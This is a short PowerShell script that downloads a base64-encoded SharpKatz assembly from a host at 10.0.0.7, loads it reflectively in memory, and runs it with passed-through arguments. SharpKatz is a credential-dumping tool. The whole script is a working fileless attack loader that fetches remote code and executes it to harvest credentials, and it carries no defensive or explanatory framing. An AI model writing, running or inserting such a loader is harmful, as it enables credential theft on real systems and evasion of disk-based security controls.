try {
    $url = "http://10.0.0.7:9090/sharpkatz.b64"
    $base64Assembly = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    if ($base64Assembly -is [byte[]]) { $base64Assembly = [Text.Encoding]::UTF8.GetString($base64Assembly) }
    [Reflection.Assembly]::Load([Convert]::FromBase64String($base64Assembly)) | Out-Null
    $arguments = @("--Command") +$args 
    [SharpKatz.Program]::Main($arguments)
} catch {
    Write-Error "Error: $($_.Exception.Message)"
    if ($_.Exception.InnerException) { Write-Error "Inner Exception: $($_.Exception.InnerException.Message)" }
}
